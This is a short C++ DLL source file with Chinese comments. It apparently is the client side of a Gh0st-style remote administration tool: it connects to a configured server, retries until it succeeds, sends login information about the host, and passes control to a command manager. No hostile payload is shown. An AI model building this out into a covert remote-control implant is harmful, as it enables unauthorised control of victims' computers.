// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include "dllmain.h"


char __ServerAddress[MAX_PATH] = { 0 };
USHORT __ConnectPort = 0;
HINSTANCE __InstanceHandle = NULL;
DWORD WINAPI WorkThreadProcedure(LPVOID ParameterData);


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        __InstanceHandle = hModule;
        break;
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

void ClientRun(char* ServerAddrss, USHORT ConnectPort)
{
    memcpy(__ServerAddress, ServerAddrss, strlen(ServerAddrss));
    __ConnectPort = ConnectPort;

    //启动一个工作线程
    HANDLE ThreadHandle = CreateThread(NULL, 0,
        (LPTHREAD_START_ROUTINE)WorkThreadProcedure,
        NULL, 0, NULL);
    int LastError = WSAGetLastError();
    //等待工作线程的正常退出
    WaitForSingleObject(ThreadHandle, INFINITE);

    _tprintf(_T("Client Bye Bye!!!\r\n"));

    if (ThreadHandle != NULL) {
        CloseHandle(ThreadHandle);
    }

}

DWORD WINAPI WorkThreadProcedure(LPVOID ParameterData)
{

    //启动一个客户端的通信类
    CIocpClient IocpClient; //触发构造函数
    BOOL ok = FALSE;


    while (1) {
        if (ok == TRUE) {
            break;
        }
        DWORD TickCount = GetTickCount();
        if (!IocpClient.ConnectServer(__ServerAddress, __ConnectPort)) {
            continue;
        }


        SendLoginInformation(&IocpClient, GetTickCount() - TickCount);

        //构建接收数据的机制
        CKernelManager	KernelManager(&IocpClient);   //负责通信的   抽象类Manager  

        //下线
        //其他功能的创建
        //
        do
        {

            //等待一个事件
            int Index = WaitForSingleObject(IocpClient.m_EventHandle, 100);

            if (Index == 0)
            {
                break;
            }
            else
            {
                continue;
            }

        } while (1);

        //退出整个循环
        ok = TRUE;
    }


    return 0;
}

